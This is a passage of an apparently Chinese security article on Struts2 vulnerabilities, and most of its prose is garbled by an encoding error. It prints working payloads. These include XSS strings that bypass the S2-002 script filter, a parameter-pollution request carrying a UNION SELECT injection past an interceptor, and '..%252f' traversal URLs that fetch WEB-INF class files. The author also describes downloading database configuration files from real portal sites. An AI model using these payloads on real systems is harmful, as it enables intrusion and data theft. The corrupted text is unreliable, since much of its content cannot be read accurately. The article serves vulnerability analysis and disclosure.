‡ç­¾å±æ€§å†…å®¹çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°xssæ¼æ´ã€‚å¦‚ä¸‹ï¼š <input name="username" onclick='xss'> å½“è¿™ä¸ªxssçš„å†…å®¹å¯ä»¥ç”±æ”»å‡»è€…æ§åˆ¶ï¼Œå³ä½¿å¯¹xssçš„å†…å®¹ä½œäº†htmlescapeï¼Œä¾ç„¶å¯ä»¥è¢«æ”»å‡»è€…bypassã€‚ åŸºäºè¿™ä¸ªåŸç†ï¼Œä½œè€…æœç´¢äº†strutsæ ‡ç­¾åº“æºç ï¼Œé‚£äº›â€œXXX.ftlâ€æ–‡ä»¶ä¸­æœç´¢â€œ}&#39;â€ç¬¦å·ï¼Œæ‰¾åˆ°Nå¤šï¼Œæµ‹è¯• å…¶ä¸­ä¸€ä¸ªå¦‚ä¸‹ï¼š ------------- <s:textfield >æ ‡ç­¾ï¼Œåœ¨æ­£å¸¸ä½¿ç”¨çš„æ—¶å€™ï¼Œä»–ä¼šæ”¾åˆ°ä¸€ä¸ª<s:form>æ ‡ç­¾å†…ï¼Œæœ€ç»ˆè¾“å‡ºhtmlåï¼Œä¼šå˜æˆä¸€ä¸ªè¾“å…¥æ¡†ã€‚ å®ƒæœ‰ä¸ªå±æ€§å«â€œtooltipâ€ï¼Œå¦‚æœè¿™ä¸ªæ ‡ç­¾ä¸ºç”¨æˆ·å¯æ§åˆ¶ï¼Œæ¯”å¦‚ä»æ•°æ®åº“ä¸­è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œè€Œè¿™ä¸ªæ ‡ç­¾æ‰€åœ¨çš„ <s:form>å¼€å¯äº†ï¼š <s:form tooltipConfig="/#{'jsTooltipEnabled':'true'}"> çš„æ—¶å€™ï¼Œç”¨æˆ·è¾“å…¥çš„tooltipçš„å€¼ï¼Œä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼š struts2.0 --&gt; <span dojoType="tooltip" ... caption="kxlzx<script></script>"> captionå†…å®¹å°±æ˜¯tooltipçš„å€¼ï¼Œä»æ•°æ®åº“æŸ¥å‡º struts2.1.6&amp;struts2.1.8 --&gt; <img onmouseover="domTT_activate(this, â€¦'StrutsTTClassic');alert('xss');a('','styleClassâ€™â€¦" /> onmouseoverç”Ÿæˆä¸€ä¸ªdomTT_activateå‡½æ•°è°ƒç”¨ï¼Œå‚æ•°ä¸­å…¶ä¸­ä¸€ä¸ªå€¼ï¼Œæ˜¯tooltipçš„å†…å®¹ã€‚è¿™é‡Œè¢«bypassäº†ã€‚ ------------ è¿™äº›æœå‡ºçš„å‡ ä¸ªä¸ªåœ°æ–¹å®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰åšä»»ä½•escapeï¼Œå°±ç›´æ¥è¾“å‡ºäº†æ•°æ®ã€‚ä¸‹é¢é‚£ä¸ªå³ä½¿åšäº†é»˜è®¤çš„ htmlescapeï¼Œè¿˜æ˜¯ä¼šå‡ºé—®é¢˜ï¼Œé™¤éå®ƒé»˜è®¤åšäº†javascriptEscapeã€‚struts2é»˜è®¤æœ‰åœ°æ–¹åšjavascriptEscapeä¹ˆï¼Ÿ ç­”æ¡ˆæ˜¯â€œæ²¡æœ‰â€ã€‚æ‰€ä»¥ï¼Œå®ƒä»¬å…¨éƒ½èƒ½è¢«XSSï¼ <img src="" alt=""> struts2çš„è¿™äº›escapeï¼Œå…¶å®æ˜¯ä¸€ä¸ªå¾ˆå¤ªç›‘çš„å®‰å…¨æ–¹æ¡ˆï¼Œå®‰å…¨å·¥ç¨‹å¸ˆæœ€æ¨çš„å°±æ˜¯è¿™ç§æ–¹æ¡ˆï¼Œåšäº†å®‰å…¨æ–¹æ¡ˆï¼Œ è¿˜ä¸åšå®Œå…¨ï¼Œç•™ä¸‹ä¸€å †é—®é¢˜ã€‚</p>
<h3 id="struts2-http-parameter-pollution-">struts2çš„HTTP Parameter Pollutionå¤„ç†ç¼ºé™·</h3>
<p>webworkå’Œstruts2éƒ½æœ‰è¿™ä¸ªé—®é¢˜ï¼Œå½“ç”¨æˆ·ç»™webåº”ç”¨æäº¤: <a href="http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61</a> æ—¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨actionä¸­å®šä¹‰äº† private String redir; public String getRedir() { return redir; } public void setRedir(String redir) { this.redir = redir; } Actionå°±ä¼šå–åˆ°redirçš„å€¼ä¸ºâ€œkxlzx, aaad61â€æ³¨æ„ä¸­é—´æ˜¯æœ‰ç©ºæ ¼çš„ã€‚ è¿™ç§æ•°æ®æ˜¯ç”±webworkï¼ˆstruts2ï¼‰æŠŠä¸¤ä¸ªå‚æ•°åˆå¹¶è€Œæˆçš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬request.getParameter(&quot;redir&quot;); æ‹¿åˆ°çš„å€¼ï¼Œå´åªæ˜¯ç¬¬ä¸€ä¸ªï¼ˆå€¼ä¸ºkxlzxï¼‰ã€‚ æˆ‘ä»¬çŸ¥é“struts2æå€¡ä½¿ç”¨æ‹¦æˆªå™¨åšä¸€äº›äº‹æƒ…ï¼Œä»–å¯ä»¥åœ¨actionçš„executeæ–¹æ³•æ‰§è¡Œä¹‹å‰å’Œä¹‹ååšä¸€äº›æ“ä½œã€‚ é‚£å°±æœ‰ä¸€äº›å¼€å‘ï¼Œæƒ³å½“ç„¶çš„åœ¨è¿™é‡Œé˜²å¾¡ä¸€ä¸‹urlè·³è½¬ã€SQLæ³¨å…¥ã€XSSç­‰æ”»å‡»ã€‚æˆ‘ä»¬çœ‹çœ‹ä»–ä»¬ä¼šæ€ä¹ˆåšï¼š @Override public String intercept(ActionInvocation arg0) throws Exception { â€¦â€¦ String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ System.out.println(&quot;find sql injection&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find sql injection&quot;); return &quot;falseuser&quot;; } String redir = request.getParameter(&quot;redir&quot;); if(redir!=null&amp;&amp;!redir.equals(&quot;<a href="http://www.b.com&quot;)){" target="_blank">http://www.b.com&quot;)){</a> System.out.println(&quot;find url redirect&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find url redirect&quot;); return &quot;falseuser&quot;; } return arg0.invoke(); } åœ¨è¿™æ®µä»£ç ä¸­ï¼Œä½œè€…ä»…ä»…ç¤ºä¾‹äº†åœ¨æ‹¦æˆªå™¨ä¸­é˜²å¾¡sqlæ³¨å…¥å’Œurlè·³è½¬æ¼æ´ï¼Œsqlæ³¨å…¥çš„é˜²å¾¡è§„åˆ™æ˜¯æ£€æŸ¥ â€œâ€™â€å•å¼•å·ï¼Œè€Œurlè·³è½¬æ¼æ´è§„åˆ™æ˜¯æ£€æŸ¥å¿…é¡»è·³è½¬åˆ°â€<a href="http://www.b.comâ€å»ã€‚ä½œè€…çŸ¥é“æ²¡æœ‰å®Œå…¨é˜²å¾¡ï¼Œ" target="_blank">http://www.b.comâ€å»ã€‚ä½œè€…çŸ¥é“æ²¡æœ‰å®Œå…¨é˜²å¾¡ï¼Œ</a> æ‰€ä»¥å¤§å®¶å…ˆä¸è¦åœ¨è¿™é‡Œè¿½ç©¶é˜²å¾¡æ–¹æ¡ˆï¼Œä»…ä»…æ˜¯ä¸€ä¸ªç¤ºä¾‹ã€‚ è€Œå¼€å‘äººå‘˜åœ¨ä¸šåŠ¡ä»£ç å¦‚ä¸‹ï¼š String sql = &quot;select book_name,book_content from books&quot;; if (name != null) { sql += &quot; where book_name like &#39;%&quot; + name + &quot;%&#39;&quot;; } å¾ˆæ˜æ˜¾èƒ½æ³¨å…¥ã€‚ public String redirect() { return &quot;redir&quot;; } ä¹Ÿæ˜æ˜¾å­˜åœ¨urlè·³è½¬æ¼æ´ã€‚ ä½†æ˜¯ç”±äºæ‹¦æˆªå™¨åœ¨actionä¹‹å‰æ‰§è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¾“å…¥äº† <a href="http://www.inbreak.net/app/test!findUserByName.action?name=a" target="_blank">http://www.inbreak.net/app/test!findUserByName.action?name=a</a>&#39; æ‹¦æˆªå™¨å½“ç„¶å°±ä¼šè¿”å›é”™è¯¯â€œfind sql injectionâ€ï¼› <img src="" alt=""> å› ä¸ºæ‰§è¡Œåˆ°äº† String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ å‘ç°nameçš„å€¼ç¡®å®æœ‰å•å¼•å·ã€‚ ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥äº† <a href="http://www.inbreak.net/app/test!findUserByName.action" target="_blank">http://www.inbreak.net/app/test!findUserByName.action</a> ?name=aaaaa&amp;name=a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; <img src="" alt=""> å°±ç›´æ¥ç»•è¿‡äº†æ‹¦æˆªå™¨çš„åˆ¤æ–­ã€‚å› ä¸ºæ‹¦æˆªå™¨è·å–çš„request.getParameter(&quot;name&quot;)ï¼Œæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼aaaaaï¼Œ æŠ›å¼ƒäº†ç¬¬äºŒä¸ªå‚æ•°çš„å€¼ï¼Œä½†æ˜¯actionä¸­çš„nameçš„å€¼ï¼Œå´æ˜¯ â€œaaaaa, a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; â€æ‰€ä»¥è¢«æ³¨å…¥äº† å¤§å¤šæ•°æ‹¦æˆªå™¨éƒ½æ˜¯è¿™æ ·åšçš„é˜²å¾¡ï¼ŒåŒ…æ‹¬ä¸€äº›filterç­‰ã€‚ è¿™ä»¶äº‹æƒ…å‘ç”Ÿåœ¨urlè·³è½¬æ¼æ´æ—¶ï¼Œå´ä¸æ˜æ˜¾ï¼Œå› ä¸ºæ”»å‡»è€…é¡¶å¤šæ„é€ ä¸€ä¸ªï¼š <a href="http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net</a> æŠ“åŒ…çœ‹çœ‹ <img src="" alt=""> å®ƒè·³åˆ°äº†<a href="http://www.b.com" target="_blank">http://www.b.com</a>, www.inbreak.netå»äº†ã€‚æ‰€ä»¥IEç›´æ¥æŠ¥é”™ï¼Œè¯´æ‰“ä¸å¼€è¿™ä¸ªåœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰åˆ«çš„ æµè§ˆå™¨ï¼Œæ€»æ˜¯å–œæ¬¢ç»™å¤§å®¶å‹å¥½ä¿¡æ¯çš„æµè§ˆå™¨ï¼Œçœ‹çœ‹chromeç»™ç”¨æˆ·ä»€ä¹ˆæç¤ºï¼š <img src="" alt=""> Chromeä¹Ÿè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„é“¾æ¥ï¼Œæ‰€ä»¥ç»™å‡ºäº†â€œæ­£ç¡®â€çš„é“¾æ¥åœ°å€ã€‚è¿™ä¸æ˜¯åˆšå¥½è¢«é’“é±¼ç½‘ç«™åˆ©ç”¨ä¹ˆï¼Ÿ struts2çš„å®˜æ–¹æ¼æ´å…¬å‘Šå’Œä¿®è¡¥åå¼•å‘çš„å®‰å…¨ç¼ºé™· ä»æœ‰struts2ï¼Œåˆ°ç°åœ¨ä¸ºæ­¢ï¼Œå®˜æ–¹ä¸€å…±å‘å¸ƒäº†4ä¸ªæ¼æ´ï¼Œåœ¨ <a href="http://struts.apache.org/2.x/docs/security-bulletins.html" target="_blank">http://struts.apache.org/2.x/docs/security-bulletins.html</a> /<em> S2-001 â€” Remote code exploit on form validation error /</em> S2-002 â€” Cross site scripting (XSS) vulnerability on <s:url> and <s:a> tags /<em> S2-003 â€” XWork ParameterInterceptors bypass allows OGNL statement execution /</em> S2-004 â€” Directory traversal vulnerability while serving static content ä»åå­—ä¸Šï¼Œå¯ä»¥çœ‹å‡ºæ¼æ´çš„å†…å®¹ï¼Œä½œè€…ä»…ä»…å¯¹å…¶ä¸­ä¸¤ä¸ªåšäº†æºç çº§åˆ«çš„æ¼æ´ä¿®è¡¥è¯„ä¼°ï¼Œå‘ç°äº†å¾ˆå¤šæ‚²å‰§çš„äº‹æƒ…ã€‚ åŒå­¦ä»¬æœ‰å…´è¶£å¯ä»¥å»ç ”ç©¶å‰©ä¸‹ä¸¤ä¸ªæ¼æ´ã€‚</p>
<h3 id="struts2-s2-002-">struts2çš„å®˜æ–¹æ¼æ´å…¬å‘Šå’Œä¿®è¡¥åå¼•å‘çš„å®‰å…¨ç¼ºé™·ï¼ˆS2-002ï¼‰</h3>
<p>å…ˆçœ‹çœ‹â€œS2-002 â€” Cross site scripting (XSS) vulnerability on <s:url> and tagsâ€è¿™ä¸ªæ¼æ´ã€‚ é¡¾åæ€ä¹‰æ˜¯å¯¹<s:url>å’Œ<s:url>çš„xssæ¼æ´ä¿®è¡¥ï¼Œä½†æ˜¯å‰æ–‡æåˆ°ï¼Œè¿™é‡Œæœ‰XSSæ¼æ´ï¼Œéš¾é“æ˜¯åœ¨å¿½æ‚ å¤§å®¶ï¼Ÿæˆ‘ä»¬ çœ‹çœ‹è¿™å¸®å·¥ç¨‹å¸ˆæ˜¯æ€ä¹ˆä¿®è¡¥çš„ï¼Œæ¥åˆ°è¿™ä¸ªsvnåœ°å€ï¼š <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h</a> æ³¨æ„è¿™ä¸¤è¡Œï¼š <img src="" alt=""> çœ‹åˆ°è¿™ä¸¤è¡Œä»£ç çš„æ—¶å€™ï¼Œä½œè€…ç¬‘äº†ï¼Œå› ä¸ºä½œè€…ä»¿ä½›çœ‹åˆ°äº†è‡³å°‘ä¸¤ä»¶æ‚²å‰§çš„äº‹æƒ…ï¼Œç°åœ¨æŠŠå®ƒä»¬å†™æˆæ•…äº‹ï¼š ç¬¬1ä»¶æ‚²å‰§çš„äº‹æƒ…ï¼ŒæŸå¹´æŸæœˆæŸæ—¥ï¼Œä¸€ä¸ªè„šæœ¬å°å­ç»™å®˜æ–¹æŠ¥å‘Šæ¼æ´ï¼Œè¯´åœ¨ä½¿ç”¨<s:url>æ ‡ç­¾çš„æ—¶å€™ï¼Œä»£ç ä¸ºï¼š <s:url action="%{/#parameters.url}"></s:url> ä¹‹åä»–è¾“å…¥äº† <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script>alert(&#39;hacked by kxlzx&#39;)</script> å¹¶å‘Šè¯‰å®˜æ–¹è¿™é‡Œæ˜¯ä¸€ä¸ªXSSæ¼æ´ï¼Œå¸Œæœ›å®˜æ–¹ä¿®è¡¥æ‰ã€‚ å®˜æ–¹å¾ˆé‡è§†ï¼Œä¸€ä¸ªå¼€å‘å°±å»ä¿®è¡¥ï¼Œæ·»åŠ å¦‚ä¸‹åˆ¤æ–­ï¼š if (result.indexOf(&quot;<script>&quot;) &gt;= 0){ result = result.replaceAll(&quot;<script>&quot;, &quot;script&quot;); å¹¶è¿›è¡Œäº†å†’çƒŸæµ‹è¯•ã€åŠŸèƒ½æµ‹è¯•ã€é»‘ç›’æµ‹è¯•ã€ç™½ç›’æµ‹è¯•ã€‚è®¤ä¸ºæ²¡æœ‰é—®é¢˜äº†ï¼Œå› ä¸ºæäº¤æ”»å‡»è€…ç»™çš„æ¶æ„urlåï¼Œè¾“å‡ºäº† scriptalert(&#39;hacked by kxlzx&#39;)</script> ç»“æœå¹¶æ²¡æœ‰åœ¨é¡µé¢æ‰§è¡Œxssè„šæœ¬ã€‚åæ¥é‚£è„šæœ¬å°å­ä¹Ÿæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ²¡é—®é¢˜ï¼Œè¿™äº‹æƒ…å°±è¿‡å»äº†ï¼Œç’ç€äººæ°‘ å¤§ä¼—ï¼Œæ‚„æ‚„çš„ä¿®è¡¥äº†ã€‚ ç¬¬2ä»¶æ‚²å‰§çš„äº‹æƒ…ï¼Œåˆè¿‡äº†æŸäººæŸæœˆæŸæ—¥ï¼ŒæŸå¦ä¸€ä¸ªè„šæœ¬å°å­åˆå‘äº†æ¼æ´ï¼Œè¿˜æ˜¯é‚£æ®µä»£ç ï¼Œä½†æ˜¯urlæ”¹æˆäº†ï¼š <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a>&lt;<script>&gt;alert(&#39;hacked by kxlzx&#39;)</script> æ³¨æ„ï¼Œè¿™é‡Œæ˜¯&lt;<script>&gt;ï¼Œç»è¿‡äº†replaceAllå‡½æ•°åï¼Œåˆšå¥½å˜æˆäº†<script>ï¼Œé‡æ–°ç»„æˆäº†XSSæ¼æ´ã€‚ å®˜æ–¹è¿™æ¬¡ä¸å¾—ä¸é‡æ–°é‡è§†èµ·æ¥ï¼Œå†³å®šæŠŠifåˆ¤æ–­ï¼Œå˜æˆäº†whileï¼Œä¸ç®¡ä½ æœ‰å¤šå°‘&lt;&lt;&lt;&lt;&lt;&lt;<script>&gt;&gt;&gt;&gt;&gt;&gt;ï¼Œéƒ½ç»™ä½ å˜æˆ scriptalert(&#39;hacked by kxlzx&#39;)</script> å¹¶è¿›è¡Œäº†å†’çƒŸæµ‹è¯•ã€åŠŸèƒ½æµ‹è¯•ã€é»‘ç›’æµ‹è¯•ã€ç™½ç›’æµ‹è¯•ã€‚è¿™æ¬¡è¿˜å‘äº†å…¬å‘Šå‡ºæ¥ï¼Œè¯´è¿™é‡Œæ²¡é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¾ˆé‡è§† å®‰å…¨æ¼æ´ï¼Œå·²ç»ä¿®è¡¥äº†ã€‚ ä½œè€…çœ‹åˆ°è¿™é‡Œï¼Œæµ‹è¯•æ–°çš„bypasså®˜æ–¹ä¿®è¡¥ä»£ç çš„urlä¸ºï¼š <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script kxlzx=kxlzx>alert(&#39;hacked by kxlzx&#39;)</script> äºæ˜¯XSSè„šæœ¬åˆè¢«æ‰§è¡Œäº†ï¼Œå› ä¸ºè¿™é‡Œæ˜¯<script kxlzx=kxlzx>ï¼Œä¸æ˜¯<script>ï¼Œæ‰€ä»¥ä¸ç¬¦åˆåˆ¤æ–­æ¡ä»¶ï¼Œæ²¡æœ‰è¢« replaceAllï¼Œå†æ¬¡bypasäº†æ¼æ´ä¿®è¡¥ã€‚ã€‚ã€‚</p>
<h3 id="struts2-s2-004-">struts2çš„å®˜æ–¹æ¼æ´å…¬å‘Šå’Œä¿®è¡¥åå¼•å‘çš„å®‰å…¨ç¼ºé™·ï¼ˆS2-004ï¼‰</h3>
<p>è¿™ä¸ªæ¼æ´çš„ä¿®è¡¥ï¼Œæ¯”ä¸Šä¸€ä¸ªæ›´åŠ ä»¤äººæ— å¥ˆï¼Œè¿™æ˜¯ä¸€ä¸ª/../è·å–èµ„æºæ–‡ä»¶çš„æ¼æ´ S2-004 â€” Directory traversal vulnerability while serving static content è¦äº†è§£è¿™ä¸ªæ¼æ´çš„æˆå› ï¼Œå¤§å®¶éœ€è¦å…ˆäº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ã€‚ å½“strutsçš„FilterDispatcheræ”¶åˆ°urlè¯·æ±‚å¦‚ä¸‹ä¸¤ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶æ—¶ï¼š <a href="http://www.inbreak.net/app/struts/" target="_blank">http://www.inbreak.net/app/struts/</a> æˆ– <a href="http://www.inbreak.net/app/static/" target="_blank">http://www.inbreak.net/app/static/</a> ä¼šå»å–strutsæ ¸å¿ƒåŒ…çš„core.src.main.resources.org.apache.struts2ä¸‹é¢çš„é™æ€èµ„æºæ–‡ä»¶ï¼Œè¿™äº›èµ„æºæ–‡ä»¶ å…¶å®æ˜¯ä¸€äº›jsè„šæœ¬å’Œä¸€äº›cssæ–‡ä»¶ã€‚å‰æ–‡æåˆ° <img onmouseover="domTT_activate(this, â€¦'StrutsTTClassic');alert('xss');a('','styleClassâ€™â€¦" /> ä»£ç ä¸­çš„domTT_activateï¼Œå…¶å®å°±æ˜¯ <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> æ–‡ä»¶ä¸­çš„ä¸€ä¸ªå‡½æ•°ã€‚ åœ¨struts2.0çš„æ—¶å€™ï¼Œåªè¦ä½ æ•¢ä¸ŠæŸå‡ ä¸ªç‰ˆæœ¬çš„struts2ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡ <a href="http://www.inbreak.net/app/struts/..%252f" target="_blank">http://www.inbreak.net/app/struts/..%252f</a> <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> æµè§ˆä½ çš„webç›®å½•ï¼Œä¸‹è½½webç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ å…ˆä¸è¯´æ¼æ´ä¿®è¡¥ï¼Œè¯·è¯»è€…èµ¶ç´§æƒ³æƒ³ï¼Œä½ å…¬å¸çš„å¼€å‘äººå‘˜ï¼Œæ˜¯å¦ä½¿ç”¨äº†struts2ï¼Œå¹¶ä¸”æŠŠ â€œStruts 2.0.0 - Struts 2.0.11.2 â€ä¹‹é—´çš„å‡ ä¸ªç‰ˆæœ¬åŒ…è£…äº†æˆ–è€…æ ¹æœ¬æ²¡æœ‰åŒ…è£…ï¼Œç›´æ¥ä¸Šäº†webåº”ç”¨ã€‚ å¦‚æœæœ‰è¿™ç§æƒ…å†µï¼Œå°±å¯ä»¥ç›´æ¥ç”¨ä»¥ä¸Šæ–¹å¼æ”»å‡»ï¼Œè¿™å‡ å¤©ä½œè€…æ‰¾äº†å‡ ä¸ªå¤§å‹é—¨æˆ·ç½‘ç«™çš„æ¼æ´ï¼Œå‘ç°ä»–ä»¬éƒ½å­˜åœ¨ è¿™ä¸ªæ¼æ´ï¼Œé¡ºä¾¿ä¸‹è½½äº†ä»–ä»¬çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼ŒåŒæ—¶æŠ¥å‘Šäº†æ¼æ´ã€‚ <img src="" alt=""> Strutså®˜æ–¹å¯èƒ½ä¹Ÿå—åˆ°äº†æ”»å‡»ï¼Œäºæ˜¯ä¿®è¡¥äº†ä»£ç ã€‚ ä½œè€…åŒæ ·æŸ¥çœ‹äº†svnä¿®è¡¥è®°å½•ï¼š <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h</a> <img src="" alt=""> å¯ä»¥çœ‹åˆ°â€œ if (!name.endsWith(&quot;.class&quot;)) {â€è¿™è¡Œä»£ç åœ¨ä¿®è¡¥æ¼æ´æ—¶ï¼Œè¢«åˆ é™¤äº†ã€‚ ä¿®è¡¥å‰çš„ä»£ç ä¸­ï¼Œä¸ºä»€ä¹ˆä»¥å‰è¦è¿‡æ»¤.classæ–‡ä»¶å‘¢ï¼Ÿæ˜¯å› ä¸ºstrutsæä¾›äº†ä¸€ä¸ªåŠŸèƒ½ï¼š å¦‚æœå¼€å‘äººå‘˜æƒ³è‡ªå·±ä½¿ç”¨è¿™ä¸ªé™æ€æ–‡ä»¶æ˜ å°„çš„åŠŸèƒ½ï¼Œå¯ä»¥é…ç½®web.xml <filter> <filter-name>struts</filter-name> <filter-class> org.apache.struts2.dispatcher.FilterDispatcher </filter-class> <init-param> <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> </init-param> </filter> å¦‚ä¸Šé…ç½®åï¼Œå½“ç”¨æˆ·è¾“å…¥ <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> çš„æ—¶å€™ï¼Œå®é™…ä¸Šstrutsä¼šå»æ‰¾net.inbreak.actionè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„domTT.jsæ–‡ä»¶å‘ç»™ç”¨æˆ·ï¼Œè€Œä¸å†å¯»æ‰¾æ ¸å¿ƒåŒ… çš„é‚£ä¸ªæ–‡ä»¶å¤¹äº†ã€‚è¿™ä¸ªåŠŸèƒ½å¼€æ”¾åï¼Œå®˜æ–¹ä¸ºäº†é˜²æ­¢å¯¹åº”åŒ…ä¸‹çš„classæ–‡ä»¶è¢«ä¸‹è½½ååç¼–è¯‘æˆæºç ï¼Œæ‰€ä»¥å†™äº†è¡Œ ä»£ç ï¼Œè¿‡æ»¤.classæ–‡ä»¶ã€‚ å°±å› ä¸ºè¿™è¡Œä»£ç çš„å­˜åœ¨ï¼Œä¸€æ—¶é—´ï¼Œåˆšå·§åˆæ­£æ˜¯struts2æµè¡Œçš„æ—¶ä»£ã€‚äº’è”ç½‘å¤§æ‰¹çš„æ–‡ç« ä»‹ç»struts2æ ¸å¿ƒæºç ï¼Œ åœ¨ä»‹ç»åˆ°FilterDispatcherçš„æ—¶å€™ï¼Œå¿…ç„¶ä¼šæåˆ°ï¼Œè¿™é‡Œä¼šè¿‡æ»¤.classæ–‡ä»¶ï¼Œå¦‚æœå¼€å‘äººå‘˜ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œ å¯ä»¥æ”¾å¿ƒï¼Œè‡ªå·±çš„classæ–‡ä»¶ä¸ä¼šè¢«äººä¸‹è½½ã€‚ åæ¥å‡ºäº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ç”¨ <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> ç»•è¿‡å®˜æ–¹é™åˆ¶ï¼Œä¸‹è½½classæ–‡ä»¶ã€‚æœ€ç»ˆçš„ç¡®ä¿®è¡¥äº†è¿™ä¸ª/../çš„æ¼æ´ã€‚ç„¶è€Œæ‚²å‰§çš„æ˜¯ï¼Œå› ä¸ºclassæ–‡ä»¶å®é™…ä¸Š è¿˜æ˜¯å¯ä»¥è¢«ä¸‹è½½ï¼Œæ‰€ä»¥å®˜æ–¹ä¿®è¡¥çš„åŒæ—¶ï¼Œå»æ‰äº†â€œif (!name.endsWith(&quot;.class&quot;)) { â€è¿™ä¸€è¡Œä»£ç ï¼Œå¯èƒ½æ˜¯ è§‰å¾—è¿™ä¸€è¡Œä»£ç å¤ªä¸¢äººã€‚ æ›¾ç»çš„æ•™ç¨‹ï¼Œè¿˜åœ¨äº’è”ç½‘ä¸Šï¼Œå‘Šè¯‰å¤§å®¶classæ–‡ä»¶ä¸ä¼šè¢«ä¸‹è½½ï¼Œå®˜æ–¹ä¹Ÿå‘è¡¨å£°æ˜ä¿®è¡¥äº†/../æ¼æ´ã€‚ä½†æ˜¯çœ‹åˆ° æ•™ç¨‹çš„å¼€å‘ä»¬ï¼Œå´æ—©å·²æŠŠç›®å½•æ˜ å°„äº†é™æ€æ–‡ä»¶ï¼š <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> å¦‚æœè¿™ä¸ªå¼€å‘çš„net.inbreak.actionåŒ…ä¸‹æœ‰ä¸ªUserLogin.classæ–‡ä»¶ï¼Œåœ¨struts2æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œä¼šé¢ä¸´ æœåŠ¡å™¨ä¸Šæ‰€æœ‰æ–‡ä»¶è¢«ä¸‹è½½çš„å‘½è¿ã€‚å³ä½¿å¼€å‘å‡çº§äº†strutsï¼Œå› ä¸ºæ ¸å¿ƒä»£ç ä¸­çš„classæ–‡ä»¶çš„åˆ¤æ–­å»æ‰äº†ï¼Œ å¯¼è‡´è¿™ä¸ªæ–‡ä»¶è¿˜æ˜¯å¯ä»¥è¢« <a href="http://www.inbreak.net/app/struts/UserLogin.class" target="_blank">http://www.inbreak.net/app/struts/UserLogin.class</a> å®˜æ–¹åœ¨æ²¡æœ‰ä»»ä½•é€šçŸ¥çš„å‰æä¸‹ï¼Œåœ¨æ•™ç¨‹æ»¡å¤©é£å‘Šè¯‰å¤§å®¶classæ–‡ä»¶ä¸ä¼šè¢«ä¸‹è½½çš„å‰æä¸‹ï¼Œä¸ºäº†é¢å­æ‚„æ‚„çš„ å–æ‰äº†è¿™ä¸ªåˆ¤æ–­ã€‚è¿™å›å¥½äº†ï¼Œæ— è®ºå‡çº§å¦ï¼Œéƒ½ä¸è®©äººæ¶ˆåœï¼Œä¸‡ä¸€å¼€å‘äººå‘˜å¤´è„‘å‘çƒ­ï¼Œé…ç½®å¦‚ä¸‹ï¼š <param-name>packages</param-name> <param-value>/</param-value> å°±å‡ºå¤§äº‹äº†ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½èµ„æºç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚ <a 